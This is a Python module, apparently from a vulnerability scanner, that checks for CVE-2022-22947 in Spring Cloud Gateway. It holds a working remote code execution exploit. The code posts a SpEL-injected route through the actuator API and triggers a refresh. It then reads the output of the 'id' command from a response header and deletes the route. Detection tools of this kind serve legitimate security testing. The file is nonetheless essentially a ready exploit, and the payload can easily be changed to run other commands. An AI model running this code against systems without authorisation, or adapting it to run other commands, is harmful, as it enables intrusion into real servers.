#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22947.py
   Description :   CVE-2022-22947 漏洞检测模块（Spring Cloud Gateway 远程命令执行）
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
from json import JSONDecodeError
from utils.custom_headers import USER_AGENTS, TIMEOUT
from colorama import Fore
from utils.logging_config import configure_logger

# 初始化日志记录
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

# CVE 编号
CVE_ID = "CVE-2022-22947"

# HTTP 请求头配置
BASE_HEADERS = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': random.choice(USER_AGENTS)
}
JSON_HEADERS = {**BASE_HEADERS, 'Content-Type': 'application/json'}
FORM_HEADERS = {**BASE_HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'}

# 有效载荷（向 Spring Cloud Gateway 添加恶意路由）
PAYLOAD = '''{
    "id": "hacktest",
    "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"}
    }],
    "uri": "http://example.com",
    "order": 0
}'''


def check(url, dns_domain="", proxies=None, session=None):
    """
    检测 CVE-2022-22947 漏洞（Spring Cloud Gateway 远程命令执行）
    :param url: 待检测的目标 URL
    :param dns_domain: DNS 日志域名（不使用，仅保持接口一致性）
    :param proxies: 代理配置（可选）
    :param session: 复用的 Session 实例（可选）
    :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
    """
    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
    session = session or requests.Session()

    try:
        # 1. 向目标添加恶意路由
        add_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
        res1 = session.post(add_route_url, headers=JSON_HEADERS, data=PAYLOAD, verify=False, timeout=TIMEOUT,
                            proxies=proxies)

        # 检查是否成功添加恶意路由（返回 201 状态码）
        if res1.status_code != 201:
            logger.info(f"[{CVE_ID} vulnerability not detected - Failed to add malicious route]",
                        extra={"target": add_route_url})
            return False, {}

        # 2. 刷新路由，激活恶意路由
        refresh_url = f"{url.strip('/')}/actuator/gateway/refresh"
        session.post(refresh_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)

        # 3. 访问恶意路由，检查是否成功执行命令
        check_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
        res3 = session.get(check_route_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{res3.status_code}]" + Fore.BLUE + f"[{res3.headers}]",
                     extra={"target": check_route_url})

        # 4. 删除恶意路由，恢复正常状态
        delete_route_url = f"{url.strip('/')}/actuator/gateway/routes/hacktest"
        session.delete(delete_route_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)
        session.post(refresh_url, headers=FORM_HEADERS, verify=False, timeout=TIMEOUT, proxies=proxies)

        # 检查返回内容中是否包含命令执行结果（"uid="）
        if res3.status_code == 200 and "uid=" in res3.text:
            details = f"{CVE_ID} vulnerability detected at {check_route_url}"
            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": check_route_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": check_route_url,
                "Details": details,
                "ResponseSnippet": res3.text[:200] + "...."  # 仅截取前200字符作为报告片段
            }

        # 如果未检测到漏洞，返回 False
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}

    except (requests.Timeout, requests.ConnectionError, requests.RequestException) as e:
        # 捕获所有请求异常，并记录到日志
        logger.error(f"[Request Error：{e}]", extra={"target": url})
        return False, {}
    except JSONDecodeError as e:
        # 捕获 JSON 解码异常，并记录到日志
        logger.error(f"[Response content is not in JSON format：{e}]", extra={"target": url})
        return False, {}
    except Exception as e:
        # 捕获所有其他未知异常，并记录到日志
        logger.error(f"[Unknown Error：{e}]", extra={"target": url})
        return False, {}
    finally:
        # 如果 session 是本模块创建的，则关闭（否则保持复用的 session 不被关闭）
        if not session:
            session.close()


if __name__ == '__main__':
    # 测试用例
    proxy = {"http": "http://user:password@localhost:8080", "https": "http://user:password@localhost:8080"}

    # 测试 CVE-2022-22947 漏洞检测
    is_vul, res = check("http://localhost:8083/", proxies=proxy)
    print(is_vul, res)